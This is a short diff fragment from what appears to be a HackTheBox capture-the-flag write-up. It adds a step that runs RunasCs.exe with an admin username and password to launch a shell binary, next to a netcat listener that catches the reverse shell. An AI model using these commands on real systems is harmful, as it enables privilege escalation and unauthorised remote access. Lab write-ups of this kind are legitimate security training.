@@ -719,6 +719,10 @@ d-r---         12/7/2019   1:14 AM                Videos
 
 We receive a shell in our listener.
 
+```powershell
+PS C:\Users\kioskUser0> .\RunasCs.exe admin Twisting3021 C:\Users\Public\shell.exe
+```
+
 ```bash
 ┌──(kali㉿kali)-[~/hackthebox/vulnescape]
 └─$ nc -lvnp 9001           
